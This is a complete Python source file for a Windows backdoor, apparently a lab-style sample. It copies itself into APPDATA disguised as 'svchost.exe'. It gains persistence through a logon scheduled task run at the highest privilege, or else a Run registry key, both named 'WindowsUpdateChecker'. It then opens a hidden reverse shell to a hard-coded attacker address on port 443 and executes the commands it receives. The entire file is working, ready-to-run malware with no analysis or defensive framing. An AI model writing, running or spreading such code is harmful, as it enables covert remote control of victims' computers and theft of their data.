import os
import shutil
import subprocess
import socket
import sys
import time
import winreg

ATTACKER_IP = "10.0.2.15"
ATTACKER_PORT = 443
PAYLOAD_ARG = "--payload"

def is_payload_instance():
    return PAYLOAD_ARG in sys.argv

def get_dest_path():
    return os.path.join(
        os.getenv("APPDATA"),
        "Microsoft", "Windows", "svchost.exe"
    )

def relocate_and_run():
    dest_path = get_dest_path()
    os.makedirs(os.path.dirname(dest_path), exist_ok=True)
    if not os.path.exists(dest_path):
        shutil.copy2(sys.executable, dest_path)
    try:
        subprocess.Popen(
            [dest_path, PAYLOAD_ARG],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except:
        pass

def set_registry_persistence(path):
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "WindowsUpdateChecker", 0, winreg.REG_SZ, f'"{path}" {PAYLOAD_ARG}')
        winreg.CloseKey(key)
    except:
        pass

def try_create_schtask(path):
    try:
        subprocess.run([
            "schtasks", "/create", "/sc", "onlogon",
            "/tn", "WindowsUpdateChecker",
            "/tr", f'"{path}" {PAYLOAD_ARG}',
            "/rl", "HIGHEST", "/f"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=False)
        return True
    except:
        return False

def establish_reverse_shell():
    time.sleep(1)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        s.send(f"[+] Connected to {os.getenv('COMPUTERNAME')} as {os.getlogin()}\n".encode())
        while True:
            s.send(b"\n> ")
            command = s.recv(1024).decode().strip()
            if command.lower() == "exit":
                break
            if not command:
                continue
            output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
            result, error = output.communicate()
            s.send(result + error)
        s.close()
    except:
        pass

def main():
    dest_path = get_dest_path()
    if is_payload_instance() or sys.executable.lower() == dest_path.lower():
        establish_reverse_shell()
    else:
        relocate_and_run()
        if not try_create_schtask(dest_path):
            set_registry_persistence(dest_path)

if __name__ == "__main__":
    main()

